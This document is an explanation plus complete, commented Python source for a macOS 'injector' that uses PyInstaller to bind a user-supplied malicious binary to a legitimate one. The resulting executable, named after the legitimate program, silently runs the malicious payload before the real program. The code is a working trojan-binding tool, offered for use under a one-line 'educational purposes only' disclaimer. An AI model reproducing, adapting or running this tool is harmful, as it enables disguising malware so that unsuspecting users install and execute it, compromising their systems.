# Detailed Explanation of the Injector Code

This code creates a binary injector tool that combines two executables: a potentially malicious one and a legitimate one. The tool generates a new executable that runs both binaries when executed. Here's a breakdown of the main components and their functions:

1. Import necessary modules:
   - os: for file and path operations
   - subprocess: for running system commands
   - shutil: for high-level file operations

2. create_inject_script function:
   - Creates a Python script that will be compiled into the final executable
   - This script contains logic to run both the malicious and legitimate binaries

3. main function:
   - Handles the main logic of the program
   - Prompts user for input (paths to malicious and legitimate binaries)
   - Generates the injection script
   - Uses PyInstaller to create the final executable
   - Performs cleanup operations

4. Styling and user interface:
   - Uses ANSI escape codes for colored output
   - Displays a stylized header

Now, here's the fully commented code in English:

```python
import os
import subprocess
import shutil

def create_inject_script(mal_bin, legit_bin):
    """
    Create a Python script that will be injected into the final executable.
    This script runs both the malicious and legitimate binaries.

    Args:
    mal_bin (str): Path to the malicious binary
    legit_bin (str): Path to the legitimate binary

    Returns:
    bool: True if the script was created successfully
    """
    # Content of the script to be injected
    script_content = f"""
import os
import sys

def run_malicious():
    # Full path to the malicious binary
    malicious_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), '{os.path.basename(mal_bin)}')
    os.system(f"chmod +x {{malicious_path}}") # Make the file executable
    os.system(malicious_path) # Execute the malicious binary

def run_legitimate():
    # Full path to the legitimate binary
    legitimate_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), '{os.path.basename(legit_bin)}')
    os.system(f"chmod +x {{legitimate_path}}") # Make the file executable
    os.system(legitimate_path) # Execute the legitimate binary

if __name__ == '__main__':
    run_malicious()
    run_legitimate()
    """
    
    # Write the content to a file named 'inject_script.py'
    with open("inject_script.py", "w") as f:
        f.write(script_content)
    return True

def main():
    # Get the directory of the current script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Display a stylized header with the modified name
    print("\033[38;2;255;69;172m" + r'''
 _________ ________ .__ .__                               
/   _____//  _____/ |  ||  |   ____   ____ _____    ____  
\_____  \/   \  ___|  ||  | _/ __ \_/ ___\\__  \  /    \ 
/        \    \_\  \  ||  |_\  ___/\  \___ / __ \|   |  \
/_______  /\______  /__||____/\___  >\___  >____  /___|  /
        \/        \/              \/     \/     \/     \/ 
        By @dgthegeek (macOS version)
    ''' + "\033[0m")

    # Prompt the user for binary paths
    mal_bin = input("Enter your \033[31mmalicious\033[0m binary path: ")
    legit_bin = input("Enter your \033[32mlegit\033[0m binary path: ")
    
    # Create the output filename
    output_name = os.path.splitext(os.path.basename(legit_bin))[0] + "-injected"
    
    # Create the injection script
    if not create_inject_script(mal_bin, legit_bin):
        print("Failed to generate inject script. Exiting.")
        return
    
    # Prepare arguments for PyInstaller
    pyinstaller_args = [
        'pyinstaller',
        '--onefile',
        '--windowed',
        f'--add-binary={mal_bin}:.',
        f'--add-binary={legit_bin}:.',
        f'--name={output_name}',
        'inject_script.py'
    ]
    
    # Run PyInstaller
    subprocess.run(pyinstaller_args, check=True)
    
    # Cleanup: remove the injection script
    os.remove("inject_script.py")
    
    # Cleanup: remove the .spec file
    spec_file = os.path.join(script_dir, f'{output_name}.spec')
    if os.path.exists(spec_file):
        os.remove(spec_file)
    
    # Cleanup: remove the build directory
    build_dir = os.path.join(script_dir, 'build')
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    
    # Move the output file and remove the dist directory
    output_path = os.path.join('dist', output_name)
    if os.path.exists(output_path):
        shutil.move(output_path, script_dir)
        shutil.rmtree('dist')
    
    # Display a success message
    print(f"\033[32mInjected binary generated and saved as:\033[0m \033[31m{output_name}\033[0m\n")

# Entry point of the script
if __name__ == "__main__":
    main()
```

This code creates a tool that:
1. Asks the user for paths to a malicious and a legitimate binary
2. Creates a Python script that can run both binaries
3. Uses PyInstaller to package this script along with both binaries into a single executable
4. Cleans up temporary files and directories created during the process

The resulting executable, when run, will execute both the malicious and legitimate binaries in sequence.

Remember, this tool is intended for educational purposes only and should be used only in controlled, authorized environments.